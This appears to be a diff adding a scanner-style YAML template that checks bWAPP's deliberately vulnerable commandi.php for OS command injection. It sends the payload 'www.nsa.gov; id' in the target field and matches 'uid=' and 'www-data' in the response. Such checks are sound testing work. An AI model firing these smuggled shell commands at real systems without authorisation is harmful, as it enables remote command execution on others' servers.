@@ -1,0 +1,41 @@
+id: bwapp-os-command-injection
+info:
+  name: OS Command Injection in commandi.php target parameter
+  severity: critical
+  description: >
+    The target parameter of commandi.php is passed to a shell command
+    (DNS lookup) without sanitisation. Appending a shell separator executes
+    arbitrary OS commands as the web user (www-data), proving remote command
+    execution.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  cwe: CWE-78
+  tags: [rce, command-injection, injection]
+variables:
+  - name: target
+    required: true
+  - name: cookie
+    required: true
+  - name: cmd
+    default: "www.nsa.gov; id"
+steps:
+  - http:
+      method: POST
+      url: "{{target}}/commandi.php"
+      headers:
+        Cookie: "{{cookie}}"
+        Content-Type: application/x-www-form-urlencoded
+      body: "target={{url_encode(cmd)}}&form=submit"
+      matchers-condition: and
+      matchers:
+        - type: word
+          part: body
+          word: "uid="
+        - type: word
+          part: body
+          word: "www-data"
+success:
+  all:
+    - type: word
+      part: body
+      word: "uid="
